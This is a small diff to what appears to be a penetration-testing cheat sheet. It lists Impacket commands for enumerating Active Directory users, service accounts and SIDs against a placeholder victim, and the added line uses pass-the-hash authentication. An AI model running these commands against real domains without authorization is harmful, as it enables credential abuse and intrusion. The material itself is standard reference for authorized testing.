@@ -29,3 +29,5 @@ impacket-GetADUsers -all -k -no-pass -dc-ip <FQDN> <DOMAIN>/<VICTIM>
 # GetUserSPNs
 impacket-GetUserSPNs -all -k -no-pass -dc-ip <FQDN> <DOMAIN>/<VICTIM>
 
+# lookupsid
+impacket-lookupsid <DOMAIN>/<VICTIM>@<HOSTNAME>.<ETC_HOST_FQDN> -hashes <HASH>
